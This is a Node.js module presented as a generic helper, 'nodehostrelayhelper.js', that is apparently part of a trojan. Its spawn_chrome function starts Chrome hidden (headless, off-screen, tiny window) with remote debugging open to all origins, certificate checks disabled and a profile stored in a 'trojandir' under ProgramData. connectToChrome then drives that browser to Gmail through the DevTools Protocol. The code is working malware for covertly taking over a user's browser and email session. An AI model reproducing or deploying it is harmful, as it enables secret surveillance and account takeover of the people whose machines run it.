console.log("--- BEGIN MODULE: nodehostrelayhelper.js ---");

const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const WebSocket = require("ws");

let modulename = path.basename(module.id);

let trojandir = "C:\\ProgramData\\owd";

var scriptdirpath = path.dirname(process.argv[1]);
var scriptfname = path.basename(process.argv[1]);
var logfpath = path.join(
    scriptdirpath,
    scriptfname + "_" + getTimestamp() + ".log"
);

function getCallerName() {
    const originalFunc = Error.prepareStackTrace;

    try {
        Error.prepareStackTrace = (err, stack) => stack;

        const err = new Error();
        const currentStack = err.stack;

        if (currentStack && currentStack[2]) {
            return currentStack[2].getFunctionName() || "SYSTEM";
        }
    } catch (e) {
    } finally {
        Error.prepareStackTrace = originalFunc;
    }

    return "unknown";
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();
}

function isNullOrWhitespace(str) {
    if (typeof str === "undefined") {
        return true;
    }

    if (!(typeof str === "string")) return false;

    return !str || !str.trim();
}

function logmsg(msgstr) {
    let callername = getCallerName();

    let prelude = `|${modulename}|${scriptfname}|${String(
        process.pid
    )}|${callername}`;
    let msgout = "";

    if (msgstr instanceof Error) {
        msgout = prelude + "|" + util.inspect(msgstr);
    } else if (typeof msgstr === "string") {
        msgout = prelude + "|" + msgstr;
    }

    console.log(msgout);

    if (!isNullOrWhitespace(logfpath))
        fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
}

function getTimestamp() {
    const date = new Date();

    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0"); //
    const day = String(date.getDate()).padStart(2, "0"); //
    const hours = String(date.getHours()).padStart(2, "0"); //
    const minutes = String(date.getMinutes()).padStart(2, "0"); //
    const seconds = String(date.getSeconds()).padStart(2, "0"); //
    const ms = String(date.getMilliseconds()).padStart(3, "0"); //

    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;

    return fullWithMs;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

function spawn_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    datadir = null,
    stdoutfunc = null,
    stderrfunc = null,
    closefunc = null
) {
    datadir = datadir || path.join(trojandir, "chrome");

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        `--headless=new`,
        `--no-first-run`,
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=2000,2000`,
        `--window-size=10,10`,
    ];

    // TODO auto discover by reading chrome lnk files
    let chrome_exe_path =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

    const child = spawn(chrome_exe_path, [...cmdlineargs], {
        // detached: true, // might cause errors
        windowsHide: true,
        // stdio: ["ignore", out, err],
        // shell: false,
        // cwd: systemstate.trojandir,
    });

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`[J4D3] child process exited with code ${code}`);
    });

    return child;
}

async function connectToChrome(debugport) {
    try {
        const response = await fetch(
            `http://localhost:${debugport}/json/version`
        );
        let responsetxt = await response.text();
        const cleanString = responsetxt.replace(/\r?\n|\r/g, "");

        const targets = JSON.parse(cleanString); //await response.json();

        const wsUrl = targets.webSocketDebuggerUrl;

        // ws_url = "ws://localhost:9222/devtools/page/"+targetid
        logmsg(`Connecting to: ${wsUrl}`);

        const ws = new WebSocket(wsUrl);

        ws.on("open", () => {
            logmsg("Connected to Chrome DevTools Protocol!");

            const command = {
                id: 1,
                method: "Page.navigate",
                params: {
                    url: "https://www.gmail.com",
                },
            };

            ws.send(JSON.stringify(command));
        });

        ws.on("message", (data) => {
            let txt = data.toString();
            logmsg(`Received response from Chrome:${txt}`);
        });

        ws.on("error", (err) => {
            logmsg(err);
        });
    } catch (error) {
        logmsg(error);
    }
}

logmsg("--- EXPORTING ---");

module.exports = {
    spawn_chrome,
    logmsg,
    getTimestamp,
    isNullOrWhitespace,
    getRandomCode,
    isPidAlive,
    connectToChrome,
};

// childp = spawn_chrome();

// logmsg(`childp: ${childp.pid} ${childp.ppid}`);

logmsg("--- END MODULE ---");

//const globalFunctions = Object.getOwnPropertyNames(globalThis).filter(prop => typeof globalThis[prop] === 'function');
//console.log(JSON.stringify(globalFunctions));
//if ( globalFunctions.includes('spawn_chrome') ) { let childp = spawn_chrome(); }
